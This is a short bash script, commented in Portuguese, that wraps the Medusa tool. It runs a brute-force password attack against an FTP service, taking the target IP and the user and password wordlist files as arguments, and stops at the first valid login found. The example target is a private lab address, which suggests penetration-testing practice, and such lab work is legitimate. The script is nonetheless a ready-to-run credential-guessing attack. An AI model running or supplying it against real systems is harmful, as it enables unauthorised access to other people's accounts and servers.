#!/bin/bash
# Wrapper simples para executar Medusa contra FTP
if [ "$#" -ne 3 ]; then
  echo "Uso: $0 ALVO ARQUIVO_USUARIOS ARQUIVO_SENHAS"
  echo "Exemplo: $0 192.168.56.20 ../wordlists/users.txt ../wordlists/passwords.txt"
  exit 1
fi

ALVO="$1"
USUARIOS="$2"
SENHAS="$3"

echo "[*] Executando Medusa FTP contra $ALVO"
medusa -h "$ALVO" -U "$USUARIOS" -P "$SENHAS" -M ftp -t 4 -f

echo "[*] Concluído. Verifique a saída do Medusa acima ou nos logs se redirecionado."
